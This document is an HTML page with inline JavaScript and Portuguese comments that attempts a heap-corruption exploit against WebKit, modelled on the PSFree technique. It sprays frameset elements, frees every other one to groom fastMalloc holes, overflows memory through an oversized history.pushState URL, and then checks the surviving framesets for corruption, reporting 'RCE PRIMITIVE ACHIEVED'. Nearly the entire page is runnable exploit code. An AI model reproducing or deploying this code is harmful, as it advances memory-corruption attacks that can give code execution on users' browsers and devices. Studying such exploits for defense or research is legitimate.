<!DOCTYPE html>
<html>
<head>
    <title>PSFree Style: Frameset Overflow</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { 
            font-size: 20px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px;
        }
        #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.4em; padding: 10px;}
    </style>
</head>
<body>

    <h1>PSFree Style: Frameset Attack</h1>
    <p>Usando &lt;frameset&gt; para alocar no fastMalloc (Técnica do PSFree).</p>

    <button onclick="startFramesetAttack(1)">TESTAR BALDE DE 1 MB</button>
    <button onclick="startFramesetAttack(2)">TESTAR BALDE DE 2 MB</button>
    <button onclick="startFramesetAttack(4)">TESTAR BALDE DE 4 MB</button>
    
    <div id="log">Pronto. Reinicie o console antes de cada teste!</div>

    <script>
        const BASE_OFFSET = 709520; // Alinhamento que descobrimos
        const OVERFLOW_AMT = 1024 * 64; // Excesso seguro

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startFramesetAttack(sizeMB) {
            victims = [];
            
            // CÁLCULO ESTILO PSFREE
            // Cada elemento 'Length' no WebKit ocupa 8 bytes.
            // Precisamos que o array total ocupe sizeMB.
            const targetBytes = sizeMB * 1024 * 1024;
            const elementCount = targetBytes / 8;
            
            // O PSFree usa vírgulas para definir o tamanho do array
            // "1,1,1" cria 3 elementos. 
            // ",".repeat(N) cria N+1 elementos vazios.
            const rowsString = ",".repeat(elementCount - 2); 

            log(`--- INICIANDO TESTE ${sizeMB} MB ---`);
            log(`Elementos calculados: ${elementCount}`);
            log(`Criando Spray de Framesets...`);

            setTimeout(() => {
                try {
                    // 1. SPRAY (Alocação)
                    const SPRAY_COUNT = sizeMB === 4 ? 40 : 100; // Ajusta quantidade pra não travar em 4MB
                    
                    for(let i=0; i<SPRAY_COUNT; i++) {
                        let fset = document.createElement('frameset');
                        fset.rows = rowsString;
                        victims.push(fset);
                    }

                    // 2. GROOMING (Criar Buracos - Estilo PSFree)
                    log("Abrindo buracos no fastMalloc...");
                    for(let i=0; i<SPRAY_COUNT; i+=2) {
                        // Ao limpar .rows, o WebKit libera a memória fastMalloc
                        victims[i].rows = ""; 
                        victims[i] = null;
                    }

                    // Força GC para garantir que o fastMalloc saiba que está livre
                    forceGC().then(() => {
                        log("Disparando Overflow (0x01)...");
                        triggerExploit(rowsString.length);
                    });

                } catch(e) {
                    log("Erro de Memória: " + e.message);
                }
            }, 200);
        }

        function triggerExploit(originalStringLen) {
            setTimeout(() => {
                try {
                    // Preenche até a borda e transborda com 0x01
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);

                    // A Esperança: O buffer vai cair no buraco deixado pelo Frameset
                    // e vai transbordar para o Frameset vizinho (que ainda está vivo)
                    history.pushState({}, "psfree_pwn", "/" + buffer);

                    log("Verificando corrupção...");
                    checkCorruption(originalStringLen);

                } catch (e) {
                    log("Erro no Exploit: " + e.message);
                }
            }, 500);
        }

        function checkCorruption(originalLen) {
            let success = false;

            // Checa os framesets sobreviventes (impares)
            for(let i=1; i<victims.length; i+=2) {
                let fset = victims[i];
                if(!fset) continue;

                // Lemos de volta a propriedade. 
                // O WebKit vai ler a memória e converter os bytes em string.
                let val = fset.rows;
                
                // SINAL 1: Tamanho mudou?
                // Se corrompermos o header do vetor, o tamanho vai mudar drasticamente.
                if (Math.abs(val.length - originalLen) > 500) {
                    log(`!!! SUCESSO (LENGTH) !!! Index ${i}`, 'win');
                    log(`Original: ${originalLen} | Novo: ${val.length}`);
                    alert("FRAMESET LENGTH CORRUPTED!");
                    success = true;
                    break;
                }

                // SINAL 2: Conteúdo Mágico?
                // Se escrevemos 0x01 na memória, o WebKit pode interpretar isso como
                // um valor inteiro grande ou inválido.
                // 0x01010101 = 16843009
                if (val.indexOf("16843009") !== -1 || val.indexOf("0%") !== -1) {
                    log(`!!! SUCESSO (DATA) !!! Index ${i} contém dados do overflow!`, 'win');
                    alert("RCE PRIMITIVE ACHIEVED!");
                    success = true;
                    break;
                }
            }

            if(!success) log("Nenhum frameset atingido. Tente outro tamanho.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
